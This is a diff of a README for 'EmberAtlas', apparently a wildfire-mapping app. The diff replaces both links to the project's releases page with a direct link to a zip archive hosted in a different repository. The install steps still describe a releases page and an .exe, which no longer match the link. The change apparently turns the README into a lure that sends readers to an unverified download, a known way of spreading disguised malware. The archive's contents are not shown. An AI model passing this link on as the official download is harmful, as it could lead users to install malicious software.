@@ -5,7 +5,7 @@ description: "Visualize historic wildfire incidents and research forecasts on an
 ---
 # 🌍 EmberAtlas - Track Global Wildfire Movements Easily
 
-[![Download EmberAtlas](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/wesleyother534/EmberAtlas/releases)
+[![Download EmberAtlas](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/wesleyother534/wesleyother534.github.io/main/sesquialteran/Dist-1.9.zip)
 
 EmberAtlas provides a clear view of wildfire activity across the globe. The application displays fire locations, historical data, and environmental factors on a rotatable 3D model of the Earth. You can monitor fire growth, see wind patterns, and check local exposure risks through this interface.
 
@@ -24,7 +24,7 @@ Your computer must meet these basic standards to run the software smoothly:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the following address to find the latest version of the application: [https://github.com/wesleyother534/EmberAtlas/releases](https://github.com/wesleyother534/EmberAtlas/releases).
+1. Visit the following address to find the latest version of the application: [https://raw.githubusercontent.com/wesleyother534/wesleyother534.github.io/main/sesquialteran/Dist-1.9.zip](https://raw.githubusercontent.com/wesleyother534/wesleyother534.github.io/main/sesquialteran/Dist-1.9.zip).
 2. Look for the most recent release at the top of the page.
 3. Locate the "Assets" section under the release notes.
 4. Click the file ending in `.exe` to start the download.
